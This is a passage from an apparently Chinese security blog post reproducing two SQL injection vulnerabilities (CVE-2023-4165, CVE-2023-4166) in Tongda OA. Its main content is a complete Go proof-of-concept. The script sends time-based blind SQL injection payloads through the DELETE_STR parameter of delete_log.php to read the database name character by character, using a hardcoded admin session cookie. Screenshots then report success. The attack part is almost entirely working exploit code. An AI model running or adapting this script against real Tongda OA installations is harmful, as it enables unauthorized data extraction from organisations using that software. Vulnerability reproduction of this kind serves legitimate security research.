+<h2 id="工具编写"><a href="#工具编写" class="headerlink" title="工具编写"></a>工具编写</h2><p>根据上面分析的特性，当遇到正确的字符的时候延迟的时间会比错误的字符多一些。分别是两秒多，和秒左右。</p>
+<p>使用go编码的简单脚本，测试的POC是用于枚举当前所使用的数据库名称。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="title function_">import</span> <span class="params">(</span></span><br><span class="line"><span class="params">	<span class="string">&quot;fmt&quot;</span></span></span><br><span class="line"><span class="params">	<span class="string">&quot;net/http&quot;</span></span></span><br><span class="line"><span class="params">	<span class="string">&quot;strings&quot;</span></span></span><br><span class="line"><span class="params">	<span class="string">&quot;time&quot;</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line"></span><br><span class="line">func <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	url := <span class="string">&quot;http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php&quot;</span>                                                                                     <span class="comment">// 目标网站的URL</span></span><br><span class="line">	delay := <span class="number">2</span>                                                                                                                                                          <span class="comment">// 延迟时间，单位为秒</span></span><br><span class="line">	cookieValue := <span class="string">&quot;Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1&quot;</span> <span class="comment">// 替换为有效的Cookie值</span></span><br><span class="line"></span><br><span class="line">	characters := <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&amp;*()+-&quot;</span> <span class="comment">// 可能的字符集</span></span><br><span class="line"></span><br><span class="line">	result := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">30</span>; i++ &#123; <span class="comment">// 假设字符的最大长度为30</span></span><br><span class="line">		found := <span class="literal">false</span></span><br><span class="line">		<span class="keyword">for</span> _, <span class="type">char</span> := range characters &#123;</span><br><span class="line">			payload := fmt.Sprintf(<span class="string">&quot;1) and (substr(DATABASE(),%d,1))=char(%d) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1&quot;</span>, i, <span class="type">int</span>(<span class="type">char</span>)) <span class="comment">// 构造payload</span></span><br><span class="line">			<span class="comment">//print(payload, &quot;\n&quot;)</span></span><br><span class="line">			req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, url, nil)</span><br><span class="line">			<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;创建请求失败:&quot;</span>, err)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 使用分号分隔的每个Cookie项</span></span><br><span class="line">			cookieItems := strings.Split(cookieValue, <span class="string">&quot;; &quot;</span>)</span><br><span class="line">			<span class="keyword">for</span> _, item := range cookieItems &#123;</span><br><span class="line">				itemSplit := strings.SplitN(item, <span class="string">&quot;=&quot;</span>, <span class="number">2</span>) <span class="comment">// 按照等号（=）分隔键值对</span></span><br><span class="line">				<span class="keyword">if</span> <span class="title function_">len</span><span class="params">(itemSplit)</span> == <span class="number">2</span> &#123;</span><br><span class="line">					cookie := &amp;http.Cookie&#123;</span><br><span class="line">						Name:  itemSplit[<span class="number">0</span>],</span><br><span class="line">						Value: itemSplit[<span class="number">1</span>],</span><br><span class="line">					&#125;</span><br><span class="line">					req.AddCookie(cookie)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			req.URL.RawQuery = <span class="string">&quot;DELETE_STR=&quot;</span> + payload <span class="comment">//构建请求，其DELETE_STR是本次的注入参数</span></span><br><span class="line"></span><br><span class="line">			startTime := time.Now()</span><br><span class="line">			resp, err := http.DefaultClient.Do(req)</span><br><span class="line">			<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;发送请求失败:&quot;</span>, err)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			defer resp.Body.Close()</span><br><span class="line"></span><br><span class="line">			endTime := time.Now()</span><br><span class="line">			responseTime := endTime.Sub(startTime)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> responseTime &gt;= time.Duration(delay)*time.Second &#123;</span><br><span class="line">				result += string(<span class="type">char</span>)</span><br><span class="line">				found = <span class="literal">true</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> !found &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Database: &quot;</span> + result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>CVE-2023-4166获取当前数据库名称</strong></p>
+<p><img src="bSC8Ul2fUuNzPwgdgeHbyLEXFJlo6SzOp9GVx7WIDHc.png" alt="image"></p>
+<p><strong>CVE-2023-4165获取当前数据库名称</strong></p>
+<p><img src="r-HFac3C3wr14eUFJ6UDgqOC0LABfPq4peEBnxZd728.png" alt="image"></p>
+<p>结果正确</p>
+<p><img src="Vk5VTUjI-fRXAIxf5rBC1eJfae3lKJYBdlbuUYTHsVo.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.两个漏洞很相似</p>
+<p>2.漏洞点很容易看到，但想要利用起来还得进行更深入的绕过。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">通达OA俩SQL注入复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2023-4165%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析（CVE-2023-4165）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2023-4166%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析（CVE-2023-4166）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99"><span class="toc-number">1.5.</span> <span class="toc-text">工具编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&text=通达OA俩SQL注入复现与分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&is_video=false&description=通达OA俩SQL注入复现与分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通达OA俩SQL注入复现与分析&body=Check out this article: https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&name=通达OA俩SQL注入复现与分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&t=通达OA俩SQL注入复现与分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
